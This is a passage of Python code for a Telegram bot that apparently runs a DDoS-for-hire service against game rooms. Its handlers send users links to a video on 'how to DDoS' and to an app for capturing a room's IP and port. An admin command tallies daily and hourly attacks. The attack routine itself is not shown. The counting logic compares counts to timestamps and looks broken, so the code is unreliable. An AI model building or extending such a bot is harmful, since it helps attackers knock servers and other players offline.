def welcome_tutorial(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐇𝐨𝐰 𝐓𝐨 𝐔𝐬𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 :

📽️ /video : 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 @BeasTxt_Sasuke.
💻 /httpcanary : 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐨 𝐂𝐚𝐭𝐜𝐡 𝐑𝐨𝐨𝐦 𝐈𝐩 𝐀𝐧𝐝 𝐏𝐨𝐫𝐭.
'''

    bot.reply_to(message, response)

@bot.message_handler(commands=['httpcanary'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐇𝐞𝐫𝐞 𝐈𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐀𝐧 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐨 𝐂𝐚𝐭𝐜𝐡 𝐑𝐨𝐨𝐦 𝐈𝐩 𝐀𝐧𝐝 𝐏𝐨𝐫𝐭 :\nhttps://t.me/bgmisellingbuying/21115'''
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['video'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐇𝐞𝐫𝐞'𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 @BeasTxt_Sasuke :\nhttps://t.me/bgmisellingbuying/21116'''
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['info'])
def show_attack_info(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        today_start = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        now = datetime.datetime.now()

        daily_attacks = sum(attack_counts[u]['daily'] for u in attack_counts if attack_counts[u]['daily'] > 0 and 
                            (attack_counts[u]['daily'] >= today_start))
        hourly_attacks = sum(attack_counts[u]['hourly'] for u in attack_counts if attack_counts[u]['hourly'] > 0 and 
                             (attack_counts[u]['hourly'] >= now - datetime.timedelta(hours=1)))
        
        response = (f"📊 Aᴛᴛᴀᴄᴋ Iɴғᴏ:\n\n"
                    f"📅 Tᴏᴅᴀʏ's Tᴏᴛᴀʟ Aᴛᴛᴀᴄᴋs: {daily_attacks}\n"
                    f"🕒 Tʜᴇ Pᴀsᴛ Hᴏᴜʀ's Tᴏᴛᴀʟ Aᴛᴛᴀᴄᴋs: {hourly_attacks}")
    else:
        response = "💢 Oɴʟʏ Aᴅᴍɪɴs Cᴀɴ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢"
    bot.reply_to(message, response)

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)

